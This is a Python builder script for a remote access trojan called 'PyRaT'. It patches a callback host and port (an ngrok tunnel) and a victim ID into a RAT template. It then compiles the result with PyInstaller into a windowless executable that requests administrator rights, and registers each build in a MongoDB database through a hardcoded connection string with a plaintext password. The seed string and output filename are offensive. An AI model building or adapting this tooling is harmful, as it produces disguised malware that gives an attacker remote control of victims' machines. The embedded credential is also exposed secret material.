import PyInstaller.__main__
import shutil
import os
import random
from pymongo import MongoClient

password = "SB5aaHgp2IYtT72e"
connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"

client = MongoClient(connection_string)
mydb = client["PyRaT"]
mycol = mydb["clients"]

id = ""
a = "JebacWikiegoSzmate"
for i in range(10):
    id = id + (a[random.randint(0, len(a)-1)])
print(id)

def build_rat(IP, PORT, filename):
    print(IP, PORT, filename)
    with open('rat.py', 'r') as file:
        filedata = file.read()

    filedata = filedata.replace('EIP', f'"{IP}"')
    filedata = filedata.replace('EPORT', f'{PORT}')
    filedata = filedata.replace('TEMP_ID', f'{id}')

    with open('mrat.py', 'w') as file:
        file.write(filedata)
    print("succesfuly modified!")



    PyInstaller.__main__.run([
        'mrat.py',
        '--onefile',
        '--noconsole',
        '--icon=./resources/icon.ico',
        f'--name={filename}',
        '--uac-admin'
    ])

    shutil.rmtree(r'build')
    os.remove('mrat.py')
    os.remove(f'{filename}.spec')


    mydict = {
    "_id": f"{id}",
    "name": "0",
    "first_connection?" : True,
    "ip" : f"{IP}",
    "port" : f"{PORT}",
    "client_ip": "0"  
        }

    x = mycol.insert_one(mydict)
    print(x.inserted_id) 

build_rat("8.tcp.ngrok.io", 19297, "HITLERIDOL")

